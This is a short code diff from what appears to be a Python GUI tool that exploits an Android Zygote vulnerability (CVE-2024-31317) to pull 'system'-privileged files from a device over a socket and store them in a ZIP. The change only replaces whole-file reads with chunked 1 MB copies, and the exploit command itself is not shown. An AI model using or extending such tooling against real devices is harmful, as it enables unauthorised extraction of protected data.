@@ -1657,6 +1657,7 @@ def exploit_zygote(zip_path, text, prog_text, change):
             #print(f"[+] sending command: {cmd.strip()!r}")
             text.configure(text=f"Expoliting CVE-2024–31317 to acquire \"system\"-Files\nTrying to pull {name}")
             sock.sendall(cmd_bytes)
+            CHUNK = 1024 * 1024
             with zipfile.ZipFile(zipname, "a", compression=zipfile.ZIP_DEFLATED) as zf:
                 class SocketReader(io.RawIOBase):
                     
@@ -1679,11 +1680,14 @@ def exploit_zygote(zip_path, text, prog_text, change):
                         f = tar.extractfile(member)
                         if f is None:
                             continue
-                        # Lies Datei-Inhalt
-                        data = f.read()
-                        # In die ZIP schreiben (mit originalem Pfadnamen)
-                        zf.writestr(member.name, data)
-                    
+                        #data = f.read()
+                        #zf.writestr(member.name, data)
+                        with zf.open(member.name, "w") as zf_out:
+                            while True:
+                                chunk = f.read(CHUNK)
+                                if not chunk:
+                                    break
+                                zf_out.write(chunk)
         finally:
             try:
                 sock.close()
